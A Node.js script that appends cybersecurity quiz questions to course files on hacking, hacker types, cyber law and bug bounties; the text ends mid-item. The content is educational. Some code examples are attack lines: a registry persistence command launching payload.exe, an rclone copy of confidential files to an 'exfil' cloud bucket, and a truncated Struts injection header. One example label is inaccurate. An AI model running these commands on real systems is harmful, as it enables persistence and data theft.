const fs = require('fs');
const path = require('path');

const baseDir = 'src/components/study/cyber-security/topics';

// Helper function to append questions to a question file
function appendQuestions(relPath, newQuestions) {
  const fullPath = path.join(baseDir, relPath);
  if (!fs.existsSync(fullPath)) {
    console.error(`File does not exist: ${fullPath}`);
    return;
  }
  let content = fs.readFileSync(fullPath, 'utf8');
  
  // Find the closing bracket before export default
  const lastBracketIndex = content.lastIndexOf('];');
  if (lastBracketIndex === -1) {
    console.error(`Cannot find closing bracket in ${fullPath}`);
    return;
  }

  const beforeBracket = content.slice(0, lastBracketIndex).trimEnd();
  const formattedNew = newQuestions.map(q => {
    return `  {\n    question: ${JSON.stringify(q.question)},\n    shortAnswer: ${JSON.stringify(q.shortAnswer)},\n    explanation: ${JSON.stringify(q.explanation)},\n    hint: ${JSON.stringify(q.hint || '')},\n    level: ${JSON.stringify(q.level || 'moderate')},\n    codeExample: ${JSON.stringify(q.codeExample || '')}\n  }`;
  }).join(',\n');

  let updatedBody = beforeBracket;
  if (!updatedBody.endsWith(',')) {
    updatedBody += ',';
  }
  updatedBody += '\n' + formattedNew + '\n];\n\nexport default questions;\n';

  fs.writeFileSync(fullPath, updatedBody, 'utf8');
  console.log(`Updated ${relPath} (+${newQuestions.length} questions)`);
}

// -----------------------------------------------------------------------------
// MODULE 002_002: Hacking, Ethical Hacking & Hacker Types
// -----------------------------------------------------------------------------

const mod2_002 = {
  '002_002_hacking-and-ethical-hacking/topic1_files/topic1_questions.js': [
    {
      question: "What role did early 'phreaking' culture play in the evolution of modern computer hacking?",
      shortAnswer: "Phreaking explored and manipulated telecommunication switching systems (e.g. John Draper's 2600 Hz whistle), establishing the reverse-engineering mindset and exploration ethic later applied to ARPANET and microcomputers.",
      explanation: "Phone phreaks demonstrated that complex automated networks could be controlled through in-band signaling tones, laying technical and cultural foundations for early hacker communities.",
      hint: "Manipulating telecom switches using audio frequencies like 2600 Hz.",
      level: "moderate",
      codeExample: "# Blue box tone generator frequency for Bell trunk lines: 2600 Hz"
    },
    {
      question: "How did the transition from mainframe terminals to personal workstations in the 1980s alter cyber threat models?",
      shortAnswer: "It decentralized computing power, bringing direct control of operating system binaries, network stacks, and storage media into decentralized user hands without centralized mainframe operator oversight.",
      explanation: "Mainframes enforced strict physical and operational boundaries. Decentralized microcomputers (like IBM PCs and Apple II) made malware distribution, floppy disk boot-sector infections (e.g. Brain virus), and dial-up wardialing viable.",
      hint: "Shift from centralized mainframe operators to decentralized personal computers.",
      level: "moderate",
      codeExample: "// 1986 Brain.c boot sector infection vector stub\nvoid infect_boot_sector(int drive) { write_sectors(drive, 0, 1, viral_code); }"
    },
    {
      question: "What was the significance of the 2000 Mafiaboy DDoS attacks on commercial internet infrastructure?",
      shortAnswer: "It proved that major multinational internet platforms (Yahoo, eBay, CNN, Amazon) could be paralyzed simultaneously by a single teenager using primitive distributed denial-of-service toolkits (Rivolta).",
      explanation: "Mafiaboy (Michael Calce) compromised university networks to launch coordinated SYN floods, prompting the FBI and international law enforcement to formalize public-private incident response partnerships.",
      hint: "Coordinated SYN floods taking down Yahoo, CNN, and eBay in February 2000.",
      level: "moderate",
      codeExample: "ping -s 65500 -f target_host # Smurf/SYN amplification prototype"
    },
    {
      question: "How did the emergence of cryptocurrency (Bitcoin) in 2009 fundamentally accelerate cyber extortion economies?",
      shortAnswer: "It provided a pseudo-anonymous, cross-border, non-custodial payment rails that eliminated traditional bank account mule risks for cyber extortionists and ransomware syndicates.",
      explanation: "Prior to cryptocurrency, digital extortion relied on easily traceable wire transfers, Western Union, or prepaid debit cards. Bitcoin enabled automated, programmatic ransom payments on a global industrial scale.",
      hint: "Decentralized, pseudo-anonymous settlement replacing traceable wire transfers.",
      level: "advanced",
      codeExample: "btc_tx = send_transaction(ransom_wallet, 2.5, private_key)"
    },
    {
      question: "What distinguishes APT (Advanced Persistent Threat) state-sponsored campaigns from 1990s hacker attacks?",
      shortAnswer: "APTs operate with military discipline, nation-state funding, stealth persistence over months/years, and strategic espionage or sabotage goals rather than public defacement or quick financial profit.",
      explanation: "1990s attacks were largely opportunistic and noisy. Modern APTs (like APT28, APT29, Lazarus) use custom zero-days, living-off-the-land techniques, and supply-chain compromises.",
      hint: "Nation-state funding, stealth persistence, and strategic geopolitical goals.",
      level: "advanced",
      codeExample: "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SvchostUpdate /t REG_SZ /d 'C:\\Windows\\Temp\\payload.exe'"
    }
  ],

  '002_002_hacking-and-ethical-hacking/topic2_files/topic2_questions.js': [
    {
      question: "What constitutes a 'Statement of Work' (SoW) and 'Rules of Engagement' (RoE) in professional ethical hacking?",
      shortAnswer: "The SoW defines project deliverables, timelines, and costs; the RoE details operational boundaries, test windows, authorized IP targets, excluded systems, and emergency contact protocols.",
      explanation: "Without a formally executed SoW and RoE signed by authorized corporate officers, technical testing constitutes unauthorized access under computer crime statutes.",
      hint: "Contractual documents specifying test windows, targets, and emergency contacts.",
      level: "moderate",
      codeExample: "RoE_Scope = { InScope: ['192.168.10.0/24'], OutOfScope: ['192.168.10.254 (Domain Controller)'] }"
    },
    {
      question: "Under the US CFAA (Computer Fraud and Abuse Act) and Indian IT Act Section 43/66, what defines 'exceeding authorized access'?",
      shortAnswer: "Accessing a computer system with authorization but using such access to obtain or alter information in the computer that the accessor is not legally entitled to obtain or alter.",
      explanation: "Even if an employee has valid login credentials, accessing sensitive databases or running exploits outside their job description constitutes illegal access under Section 66 and CFAA §1030.",
      hint: "Using valid login credentials to view or modify unauthorized sensitive data.",
      level: "moderate",
      codeExample: "// IT Act 2000 Section 66: Dishonest or fraudulent extraction of system resources"
    },
    {
      question: "What is the principle of 'Non-Destructive Testing' in commercial penetration testing?",
      answer: "Testing methodologies designed to identify and validate vulnerabilities without causing system crashes, data corruption, hardware damage, or denial of service to production operations.",
      explanation: "Ethical hackers avoid payload execution that writes garbage data or exhausts disk/RAM. For instance, testing SQL injection with 'SLEEP(1)' or '1=1' instead of 'DROP TABLE'.",
      hint: "Proving exploitability without dropping tables or crashing servers.",
      level: "moderate",
      codeExample: "' OR 1=1 -- Valid non-destructive SQLi proof of concept"
    },
    {
      question: "What is an 'Indemnification Clause' in a penetration testing agreement?",
      shortAnswer: "A contractual term that protects the cybersecurity testing firm from financial liabilities or third-party lawsuits if systems inadvertently fail during authorized, compliant testing.",
      explanation: "Indemnification ensures that provided the security firm operated strictly within agreed RoE, accidental service disruptions do not result in catastrophic breach of contract damages.",
      hint: "Legal shield protecting testers from operational disruption claims within scope.",
      level: "advanced",
      codeExample: "Clause 14.2: Client agrees to hold harmless Contractor for unintended outages within authorized scope."
    },
    {
      question: "What ethical dilemma arises when an ethical hacker discovers unredacted PII or criminal evidence during an engagement?",
      shortAnswer: "The tester must halt inspection of the compromised data immediately, document the vulnerability using minimal proof, report the finding to the designated legal/executive liaison, and avoid personal retention.",
      explanation: "Ethical guidelines (EC-Council, SANS, CREST) mandate reporting the security flaw without collecting, copying, or distributing private personal records or confidential corporate secrets.",
      hint: "Stop reading immediately, document minimally, and report to legal liaison.",
      level: "advanced",
      codeExample: "// Secure wipe any transient local cache containing discovered PII:\nshred -u -z -n 3 /tmp/discovered_pii.csv"
    }
  ],

  '002_002_hacking-and-ethical-hacking/topic3_files/topic3_questions.js': [
    {
      question: "What is the primary difference between a Penetration Tester and a Vulnerability Assessment Analyst?",
      shortAnswer: "A Vulnerability Assessment Analyst identifies and catalogs potential security flaws; a Penetration Tester actively exploits those flaws to demonstrate real-world impact and lateral movement.",
      explanation: "VA is broad and largely automated (e.g. running Nessus/Qualys); penetration testing is deep, manual, and seeks to validate attack vectors and achieve specific objective flags.",
      hint: "Scanning for flaws vs actively chaining exploits to prove impact.",
      level: "moderate",
      codeExample: "nmap --script vuln 10.0.0.5 # VA phase vs msfconsole exploit # PenTest phase"
    },
    {
      question: "What certifications are internationally recognized benchmarks for White Hat ethical hackers?",
      shortAnswer: "OffSec OSCP (Offensive Security Certified Professional), EC-Council CEH, SANS GIAC GPEN/GXPN, and CREST Certified Tester.",
      explanation: "OSCP tests hands-on practical exploitation skills in a 24-hour live lab environment, while GPEN and CEH cover broad enterprise methodology, tools, and regulatory ethics.",
      hint: "Practical certifications like OSCP, GPEN, and CEH.",
      level: "basic",
      codeExample: "CertificationRoadmap = ['Security+', 'CEH', 'OSCP', 'OSCE'];"
    },
    {
      question: "Why do White Hat hackers document their findings in comprehensive Executive Summaries and Technical Reports?",
      shortAnswer: "Because the ultimate value of ethical hacking is enabling corporate leadership to allocate remediation budget and technical engineers to patch specific configuration or code flaws.",
      explanation: "The report bridges the gap between C-suite risk management (business impact, CVSS scores) and systems engineering (step-by-step reproduction and patch guidance).",
      hint: "Translating technical exploit paths into executive business risk and patch steps.",
      level: "moderate",
      codeExample: "ReportStructure = { ExecutiveSummary: 'Business Risk', TechnicalFindings: 'PoC & Remediation' };"
    },
    {
      question: "How do White Hat consultants verify that vulnerabilities have been remediated successfully?",
      shortAnswer: "Through a structured 'Retest' (Verification Assessment) where the exact exploit scripts and test cases from the initial assessment are rerun against patched systems.",
      explanation: "Retesting verifies that patches are applied correctly, that remediation did not introduce regressions, and that compensating firewall/WAF rules effectively block the exploit.",
      hint: "Executing the original PoC against the patched build to ensure closure.",
      level: "moderate",
      codeExample: "python3 exploit_poc.py target.com # Expected result: 403 Forbidden or Patched"
    },
    {
      question: "What is 'Responsible Disclosure' as practiced by White Hat security researchers?",
      shortAnswer: "Privately notifying the vendor of a discovered vulnerability, granting a reasonable grace period (typically 90 days) for patching before releasing any public advisory.",
      explanation: "This policy prevents malicious actors from exploiting zero-day flaws while holding vendors accountable for releasing timely security patches to protect end users.",
      hint: "Coordinated vulnerability disclosure giving vendors 90 days to issue a fix.",
      level: "advanced",
      codeExample: "GPG_Encrypt(advisory.txt, vendor_security_public_key)"
    }
  ],

  '002_002_hacking-and-ethical-hacking/topic4_files/topic4_questions.js': [
    {
      question: "What is an 'Initial Access Broker' (IAB) in the cybercriminal underground economy?",
      shortAnswer: "A threat actor who compromises enterprise networks (via phishing, RDP brute force, or stolen credentials) and sells the persistent backdoor access to ransomware gangs on dark web markets.",
      explanation: "IABs specialize in reconnaissance and exploitation, outsourcing extortion and data theft to ransomware affiliates (RaaS model) for a fee or revenue share.",
      hint: "Underground specialists who breach networks and auction off persistent access.",
      level: "moderate",
      codeExample: "# Dark web listing: 'Access to $500M US Healthcare Corp, Domain Admin, $4,000 XMR'"
    },
    {
      question: "How does the 'Double Extortion' tactic employed by Black Hat ransomware cartels work?",
      shortAnswer: "Attackers exfiltrate confidential corporate data BEFORE encrypting internal servers, threatening to publicly leak stolen records if the decryption ransom is not paid.",
      explanation: "Double extortion defeats offline backups; even if the victim restores systems from clean tape archives, they must pay to prevent regulatory fines (GDPR/HIPAA) and public exposure.",
      hint: "Stealing data before encrypting, then threatening public leaks on a DLS.",
      level: "advanced",
      codeExample: "rclone copy C:\\Confidential\\ mega:exfil_bucket/ --transfers 16"
    },
    {
      question: "What is a 'Dark Web Data Leak Site' (DLS) in Black Hat operations?",
      shortAnswer: "A Tor hidden service (.onion site) operated by ransomware groups to name and shame non-paying victims, countdown deadlines, and publish leaked proprietary data dumps.",
      explanation: "Pioneered by the Maze ransomware group in 2019, leak sites weaponize reputational damage and regulatory scrutiny to compel extortion settlements.",
      hint: "Tor onion site used by extortionists to publish non-paying victim data.",
      level: "moderate",
      codeExample: "torify curl -s http://lockbit3...onion/victim_countdown"
    },
    {
      question: "What are 'Bulletproof Hosting' providers and why are they favored by Black Hat groups?",
      shortAnswer: "Hosting services located in non-extradition jurisdictions that intentionally ignore DMCA takedown requests, law enforcement subpoenas, and abuse complaints.",
      explanation: "Bulletproof hosts provide command-and-control (C2) infrastructure and malware distribution points resistant to court-ordered seizure or Western law enforcement coordination.",
      hint: "Web hosts that refuse to cooperate with international police subpoenas.",
      level: "moderate",
      codeExample: "whois c2_server.com | grep 'OrgName: Offshore Bulletproof Networks'"
    },
    {
      question: "What motivates Black Hat actors beyond financial gain?",
      shortAnswer: "Geopolitical sabotage, intellectual property theft, state-directed espionage, personal notoriety (ego), revenge (insider threats), and ideological warfare.",
      explanation: "While cybercrime syndicates pursue profit, state-sponsored Black Hats prioritize long-term geopolitical advantage, such as stealing military blueprints or disrupting critical infrastructure.",
      hint: "Espionage, geopolitical dominance, IP theft, revenge, and ideology.",
      level: "basic",
      codeExample: "TargetSectors = ['Defense', 'Semiconductors', 'Energy Grids', 'Gov Agencies'];"
    }
  ],

  '002_002_hacking-and-ethical-hacking/topic5_files/topic5_questions.js': [
    {
      question: "What defining characteristic distinguishes a Grey Hat hacker from a White Hat or Black Hat hacker?",
      shortAnswer: "A Grey Hat acts without prior authorization or permission from the target system owner, but without malicious intent to steal data or cause destructive harm.",
      explanation: "They may discover a flaw on a live website uninvited and then contact the owner offering to fix it, sometimes requesting a fee or threatening disclosure if ignored.",
      hint: "Hacking without prior permission, but without malicious or destructive intent.",
      level: "moderate",
      codeExample: "EmailDraft: 'Dear Admin, I found an SQL injection on your checkout page without your consent...'"
    },
    {
      question: "Why is Grey Hat activity legally considered illegal under the Computer Fraud and Abuse Act (CFAA)?",
      shortAnswer: "Because laws against hacking do not require malicious intent; gaining unauthorized access to a protected computer is itself a statutory crime.",
      explanation: "Courts evaluate whether authorization was granted beforehand. Good intentions do not convert unauthorized digital trespassing into lawful activity.",
      hint: "Absence of prior authorization makes it a crime regardless of intent.",
      level: "moderate",
      codeExample: "// Legal violation: Accessing /admin endpoint via authentication bypass without written consent"
    },
    {
      question: "What is an example of a famous Grey Hat incident in cybersecurity history?",
      shortAnswer: "The 2002 Adrian Lamo intrusions into The New York Times, Microsoft, and Yahoo, where he searched for flaws from internet cafes and notified victims without destroying systems.",
      explanation: "Lamo was convicted under the CFAA, received probation and restitution orders, illustrating that even helpful Grey Hat disclosure attracts criminal prosecution.",
      hint: "Adrian Lamo penetrating The New York Times internal lexicons and networks.",
      level: "moderate",
      codeExample: "curl -X GET http://internal.target.com/debug/database_dump.php"
    },
    {
      question: "What danger does an enterprise face when negotiating with a Grey Hat who demands a 'consulting fee'?",
      shortAnswer: "It borders on commercial extortion; paying may incentivize future unauthorized probing and risks violating financial fraud or anti-extortion regulations.",
      explanation: "Security teams must treat unauthorized probing as an incident, triage the reported bug, and refer monetary demands to legal and law enforcement authorities.",
      hint: "Demanding payment for uninvited bug discoveries resembles extortion.",
      level: "advanced",
      codeExample: "TriagePolicy: 'Route unsolicited vulnerability demands immediately to General Counsel.'"
    },
    {
      question: "How have Bug Bounty Safe Harbor policies helped convert Grey Hat activities into legitimate White Hat research?",
      shortAnswer: "By legally pledging that security researchers who operate within scope and report flaws without exploiting data will NOT face legal prosecution under the CFAA.",
      explanation: "Safe Harbor clauses provide legal protection, channeling inquisitive researchers into authorized vulnerability disclosure programs.",
      hint: "Legal pledge by companies not to sue researchers adhering to program rules.",
      level: "moderate",
      codeExample: "SafeHarborClause: 'Company will not pursue legal action against researchers acting in good faith.'"
    }
  ],

  '002_002_hacking-and-ethical-hacking/topic6_files/topic6_questions.js': [
    {
      question: "What is the primary role of a 'Purple Team' in an enterprise security organization?",
      shortAnswer: "A collaborative function that integrates Red Team offensive tactics with Blue Team defensive capabilities in real-time to rapidly test, validate, and tune detection rules.",
      explanation: "Instead of adversarial silos, Purple Teaming runs tabletop and live exercises where an attack technique is executed and defensive logs (SIEM/EDR) are checked and tuned simultaneously.",
      hint: "Facilitating real-time collaboration between offensive Red and defensive Blue teams.",
      level: "moderate",
      codeExample: "PurpleTeamLoop = () => { RedExecuteTactic(); BlueVerifyDetection(); TuneEDRRule(); };"
    },
    {
      question: "What are the core technical tools commonly utilized by a Blue Team (Defenders)?",
      shortAnswer: "SIEM (Splunk, Elastic), EDR (CrowdStrike, SentinelOne), NDR (Zeek, Suricata), Firewalls/WAFs, and SOAR automation platforms.",
      explanation: "Blue teams monitor telemetry streams, correlate indicators of compromise (IoCs), triage alerts, and execute automated containment playbooks.",
      hint: "SIEM, EDR, network sensors, and incident response playbooks.",
      level: "basic",
      codeExample: "index=firewall action=blocked src_ip=192.168.1.100 | stats count by dest_ip"
    },
    {
      question: "What is an 'Atomic Red Team' test in purple teaming methodologies?",
      shortAnswer: "A library of simple, scripted, highly focused open-source tests mapped directly to the MITRE ATT&CK framework used to test whether specific defensive telemetry alerts fire.",
      explanation: "Developed by Red Canary, Atomic tests execute specific techniques (e.g. T1003 OS Credential Dumping) in seconds to confirm detection coverage.",
      hint: "Scripted unit tests mapped to MITRE ATT&CK techniques to verify EDR alerts.",
      level: "moderate",
      codeExample: "Invoke-AtomicTest T1003.001 -TestNumbers 1 # Tests LSASS dump detection"
    },
    {
      question: "What metrics evaluate the operational effectiveness of a Blue Team Security Operations Center (SOC)?",
      shortAnswer: "MTTD (Mean Time to Detect) and MTTR (Mean Time to Respond / Remediate).",
      explanation: "Top-tier SOCs aim for the '1-10-60 rule': 1 minute to detect an intrusion, 10 minutes to investigate, and 60 minutes to remediate and contain.",
      hint: "Mean Time to Detect (MTTD) and Mean Time to Respond (MTTR).",
      level: "moderate",
      codeExample: "SOC_Metrics = { MTTD_Target: '15_minutes', MTTR_Target: '60_minutes' };"
    },
    {
      question: "What is the role of a Yellow Team or Orange Team in specialized cyber team taxonomy?",
      shortAnswer: "Yellow Teams consist of software developers and architects building security into application code; Orange Teams focus on education, training, and building security awareness across developers.",
      explanation: "Modern DevSecOps taxonomies define teams across the color spectrum: Red (Offense), Blue (Defense), Yellow (Builders), Orange (Trainers), Green (Automation).",
      hint: "Software developers building secure systems (Yellow) and trainers (Orange).",
      level: "advanced",
      codeExample: "DevSecOpsPipeline: git commit -> SAST (Yellow) -> DAST (Red) -> WAF Rules (Blue)"
    }
  ],

  '002_002_hacking-and-ethical-hacking/topic7_files/topic7_questions.js': [
    {
      question: "What defines a 'Script Kiddie' in cybersecurity threat actor taxonomy?",
      shortAnswer: "An unskilled individual who executes pre-written automated exploit scripts and tools (e.g. LOIC, Metasploit scripts) without understanding the underlying code, protocols, or architecture.",
      explanation: "Script kiddies lack foundational programming or protocol knowledge; they operate for bragging rights, personal spite, or vandalism, often leaving extensive digital forensic trails.",
      hint: "Unskilled attacker running downloaded tools without understanding how they work.",
      level: "basic",
      codeExample: "# Typical script kiddie tool: LOIC (Low Orbit Ion Cannon) GUI button click"
    },
    {
      question: "What is 'Hacktivism' and what distinguishes its attack patterns from cybercrime?",
      shortAnswer: "Hacking driven by political, religious, environmental, or social justice ideologies rather than personal financial profit.",
      explanation: "Hacktivists (e.g. Anonymous) utilize website defacements, data doxxing, and massive DDoS attacks to draw public and media attention to political causes or corporate abuses.",
      hint: "Politically motivated hacking using defacements, leaks, and DDoS.",
      level: "moderate",
      codeExample: "# Hacktivist signature: Web defacement with political manifesto and logo"
    },
    {
      question: "What characteristic hallmarks distinguish Nation-State Threat Actors (APT groups)?",
      shortAnswer: "Virtually unlimited budgets, zero-day exploit stockpiles, military chain of command, focus on critical infrastructure and defense secrets, and extreme anti-forensic stealth.",
      explanation: "Nation-state groups (e.g. Russia's Sandworm, China's APT41, North Korea's Lazarus) prioritize intelligence gathering, long-term persistence, or strategic infrastructure disruption.",
      hint: "Nation-state funding, zero-day exploits, and long-term geopolitical espionage.",
      level: "advanced",
      codeExample: "StuxnetPLC_Vector = 'Target Siemens S7-300 centrifuges at Natanz enrichment facility';"
    },
    {
      question: "What is a 'Cyber Mercenary' or Private Sector Offensive Actor (PSOA)?",
      shortAnswer: "Commercial technology companies that develop and sell high-end surveillance spyware and zero-click mobile exploits to governments and intelligence agencies (e.g. NSO Group).",
      explanation: "PSOAs commercialize military-grade cyber capabilities, selling spyware (like Pegasus) capable of extracting messages, microphone audio, and location from mobile devices.",
      hint: "Commercial firms selling zero-click mobile spyware to nation-states.",
      level: "advanced",
      codeExample: "Pegasus_ZeroClick: Exploits iOS CoreGraphics / ImageIO via silent iMessage packet"
    },
    {
      question: "Why do 'Insider Threats' represent one of the most dangerous threat actor categories?",
      shortAnswer: "Because insiders possess legitimate authorized credentials, direct physical or logical access behind perimeter firewalls, and knowledge of where critical data assets reside.",
      explanation: "Insiders (disgruntled employees, bribed contractors) bypass perimeter firewalls and IDS. Detecting them requires User and Entity Behavior Analytics (UEBA) and Zero Trust policies.",
      hint: "Legitimate credentials and direct access bypassing perimeter defenses.",
      level: "moderate",
      codeExample: "UEBA_Alert = detect_anomaly(user='finance_clerk', action='download_100GB_source_code_at_3am');"
    }
  ],

  '002_002_hacking-and-ethical-hacking/topic8_files/topic8_questions.js': [
    {
      question: "What is Section 66F of the Indian Information Technology Act (IT Act 2000)?",
      shortAnswer: "It defines and criminalizes Cyber Terrorism, carrying a mandatory statutory penalty of up to life imprisonment.",
      explanation: "Section 66F penalizes acts committed with intent to threaten the unity, integrity, security, or sovereignty of India, or strike terror by denying access to authorized computer resources.",
      hint: "Section penalizing Cyber Terrorism with imprisonment up to life.",
      level: "moderate",
      codeExample: "IT_Act_2000_Sec66F = { Offense: 'Cyber Terrorism', MaxPenalty: 'Life Imprisonment' };"
    },
    {
      question: "What is a 'Get Out of Jail Free Card' in penetration testing terminology?",
      shortAnswer: "A written, signed authorization letter from executive leadership carried by physical and technical penetration testers during active engagements.",
      explanation: "If security guards or police intervene during testing, this document confirms that the tester is an authorized contractor acting lawfully under executive management direction.",
      hint: "Formal executive letter carried by penetration testers to prove authorization.",
      level: "basic",
      codeExample: "AuthorizationLetter: 'Tester X is contracted by Board of Directors to perform security audit.'"
    },
    {
      question: "How does the Budapest Convention on Cybercrime facilitate international law enforcement coordination?",
      shortAnswer: "It provides a standardized legal framework for cross-border criminalization of hacking, real-time collection of internet traffic data, and mutual legal assistance across signatory nations.",
      explanation: "Because internet infrastructure is global, the Budapest Convention harmonizes cyber laws, allowing police in one nation to request digital evidence preservation in another.",
      hint: "International treaty harmonizing cyber laws and cross-border evidence sharing.",
      level: "advanced",
      codeExample: "MLAT_Request: 'Mutual Legal Assistance Treaty request for server logs in jurisdiction B'"
    },
    {
      question: "What is Section 43 of the Indian Information Technology Act 2000?",
      shortAnswer: "It prescribes civil penalties and damages (compensation up to ₹1 Crore to affected victims) for unauthorized access, data copying, virus introduction, or damage to computer systems.",
      explanation: "Section 43 deals with civil liability for computer damage and data theft; when committed dishonestly or fraudulently, Section 66 converts it into a criminal offense.",
      hint: "Civil liability and compensation for unauthorized computer access and damage.",
      level: "moderate",
      codeExample: "IT_Act_Sec43: Compensation for unauthorized downloading, copying, or extracting data"
    },
    {
      question: "Why must penetration testers never test third-party cloud infrastructure (like AWS or Azure) without proper provider notification?",
      shortAnswer: "Because cloud infrastructure is shared (multi-tenant); unauthorized probing may degrade adjacent tenant workloads and violates the cloud provider's Acceptable Use Policy (AUP).",
      explanation: "Major cloud providers (AWS, Microsoft Azure, Google Cloud) have specific penetration testing policies defining permissible targets and prohibiting DDoS or stress tests.",
      hint: "Multi-tenant cloud risks and violations of cloud Acceptable Use Policies.",
      level: "moderate",
      codeExample: "AWS_PenTest_Policy: 'Testing permitted on customer EC2; prohibited against Route53 or CloudFront.'"
    }
  ],

  '002_002_hacking-and-ethical-hacking/topic9_files/topic9_questions.js': [
    {
      question: "How does an Ethical Hacker contribute to an enterprise's Attack Surface Reduction (ASR)?",
      shortAnswer: "By identifying and retiring obsolete outward-facing services, unused IP addresses, legacy API endpoints, and unnecessary open firewall ports.",
      explanation: "Every exposed service is an entry vector. Ethical hacking exercises map the entire external perimeter, allowing IT teams to close down unmaintained services.",
      hint: "Closing unused open ports, shutting down legacy servers, and removing old APIs.",
      level: "moderate",
      codeExample: "nmap -p- -sS -T4 target.com # Identifies rogue forgotten listening ports"
    },
    {
      question: "What is the difference between Black Box, White Box, and Grey Box security testing?",
      shortAnswer: "Black Box: zero prior knowledge of internal architecture; White Box: full access to source code, network diagrams, and credentials; Grey Box: partial knowledge (e.g. user credentials).",
      explanation: "Black Box simulates an external adversary; White Box maximizes vulnerability discovery via code audits; Grey Box provides the best balance of time and realistic privilege simulation.",
      hint: "Zero knowledge (Black), full knowledge and source code (White), partial access (Grey).",
      level: "basic",
      codeExample: "TestingModes = { BlackBox: 'No info', GreyBox: 'User creds', WhiteBox: 'Source code' };"
    },
    {
      question: "What is DevSecOps and how do security assessments integrate into CI/CD pipelines?",
      shortAnswer: "Integrating automated security testing (SAST, DAST, dependency scanning) directly into the Continuous Integration / Continuous Deployment software release pipeline.",
      explanation: "Security is 'shifted left'; code commits are automatically analyzed for vulnerabilities before deployment, preventing flawed software from reaching production.",
      hint: "Automated security tests executing on every git commit in the build pipeline.",
      level: "moderate",
      codeExample: "gitlab-ci.yml: sast_scan: script: ['trivy fs --exit-code 1 --severity CRITICAL .']"
    },
    {
      question: "What is the role of an ethical hacker during an enterprise 'Threat Modeling' exercise?",
      shortAnswer: "To adopt an adversary mindset, decomposing the application architecture to identify potential threat agents, attack vectors, and missing defensive controls using frameworks like STRIDE.",
      explanation: "Ethical hackers highlight non-obvious trust boundary crossings and logical flaws before developers write production code.",
      hint: "Applying adversary thinking to architecture diagrams using frameworks like STRIDE.",
      level: "advanced",
      codeExample: "STRIDE = ['Spoofing', 'Tampering', 'Repudiation', 'Info Disclosure', 'DoS', 'Elevation'];"
    },
    {
      question: "Why are third-party ethical hacking audits mandatory under compliance standards like PCI-DSS and SOC 2?",
      shortAnswer: "To provide independent, objective, unbiased verification that internal security controls function effectively and have not been bypassed by internal personnel.",
      explanation: "Self-audits suffer from cognitive bias and institutional blind spots. External audits guarantee that payment card data and customer records meet rigorous security thresholds.",
      hint: "Independent third-party validation required by financial compliance frameworks.",
      level: "moderate",
      codeExample: "PCI_DSS_Requirement_11_3: 'Perform external and internal penetration testing annually.'"
    }
  ],

  '002_002_hacking-and-ethical-hacking/topic10_files/topic10_questions.js': [
    {
      question: "What is the difference between a Vulnerability Disclosure Program (VDP) and a Bug Bounty Program?",
      shortAnswer: "A VDP provides a secure, legal channel to report vulnerabilities without financial reward; a Bug Bounty Program actively offers monetary compensation (bounties) for valid bugs.",
      explanation: "All mature organizations should have a VDP (like a digital security.txt); bug bounties incentivize skilled global security researchers with cash rewards based on severity.",
      hint: "VDP provides legal intake channel; bug bounty awards cash payouts.",
      level: "moderate",
      codeExample: "// Standard security.txt placed in /.well-known/security.txt:\nContact: security@company.com\nPolicy: https://company.com/vdp"
    },
    {
      question: "How does the Common Vulnerability Scoring System (CVSS) determine bug bounty payouts?",
      shortAnswer: "CVSS calculates a standardized 0.0 to 10.0 score based on attack vector, complexity, privileges required, and impact on CIA; higher scores command larger financial rewards.",
      explanation: "Bounties typically follow tiers: Low (0.1-3.9), Medium (4.0-6.9), High (7.0-8.9), and Critical (9.0-10.0, e.g. remote code execution paying $10,000+).",
      hint: "Standardized 0-10 metric rating exploitability and CIA impact to tier cash payouts.",
      level: "moderate",
      codeExample: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H # Critical 10.0 Base Score"
    },
    {
      question: "What is a 'Duplicate Submission' in bug bounty platforms (HackerOne, Bugcrowd)?",
      shortAnswer: "A report describing a vulnerability that another security researcher has already submitted earlier; only the first reporter receives the bounty and reputation credit.",
      explanation: "Platform triagers compare timestamps; duplicate submissions are marked as closed without payout, emphasizing speed and thoroughness in bounty hunting.",
      hint: "Another researcher reported the same flaw first; only the first gets paid.",
      level: "basic",
      codeExample: "Status: Closed - Duplicate of Report #1849204"
    },
    {
      question: "What is the purpose of the RFC 9116 `security.txt` file on web servers?",
      shortAnswer: "It provides a machine-readable, standardized location (`/.well-known/security.txt`) containing security contact information, encryption keys, and vulnerability policies for researchers.",
      explanation: "Standardized by the IETF, `security.txt` helps ethical researchers quickly find how to report security bugs without resorting to guessing corporate email addresses.",
      hint: "Well-known text file containing security team contact details and PGP key.",
      level: "moderate",
      codeExample: "curl https://example.com/.well-known/security.txt"
    },
    {
      question: "Why do companies enforce strict 'Out of Scope' rules in their bug bounty briefs?",
      shortAnswer: "To protect mission-critical operations from disruptive tests, such as physical office intrusions, employee social engineering/phishing, and volumetric DDoS attacks.",
      explanation: "Testing out-of-scope targets (e.g. third-party payment gateways like Stripe or employee personal phones) results in immediate disqualification and potential legal liability.",
      hint: "Excluding DDoS, social engineering, and third-party vendors from testing.",
      level: "moderate",
      codeExample: "OutOfScope: ['Denial of Service (DoS)', 'Spam / Social Engineering', 'Physical Testing']"
    }
  ],

  '002_002_hacking-and-ethical-hacking/topic11_files/topic11_questions.js': [
    {
      question: "What technical lessons were learned from the 2017 Equifax data breach?",
      shortAnswer: "A critical Apache Struts vulnerability (CVE-2017-5638) remained unpatched for over two months due to flawed vulnerability management, allowing attackers to steal 147 million records.",
      explanation: "The breach highlighted the vital necessity of software inventory assets, automated patch deployment, and network segmentation to prevent lateral movement from web apps to core databases.",
      hint: "Unpatched Apache Struts parser flaw leading to 147 million exposed credit files.",
      level: "moderate",
      codeExample: "# Apache Struts OGNL injection header:\nContent-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)...}"
    },
    {
      question: "How did ethical white hat researcher Marcus Hutchins stop the 2017 global WannaCry ransomware epidemic?",
      shortAnswer: "By reverse-engineering the malware binary, discovering an unregistered hardcoded domain kill-switch, and registering that domain for $10.69, which caused WannaCry to deactivate itself.",
      explanation: "The ransomware tested an HTTP connection to the unregistered domain before encrypting; if the domain was active and responded, WannaCry exited to avoid running in security analysis sandboxes.",
      hint: "Reverse-engineering the binary and registering an unregistered kill-switch web domain.",
      level: "moderate",
      codeExample: "if (InternetOpenUrlA(hSession, 'http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com', ...)) exit(0);"
    },
    {
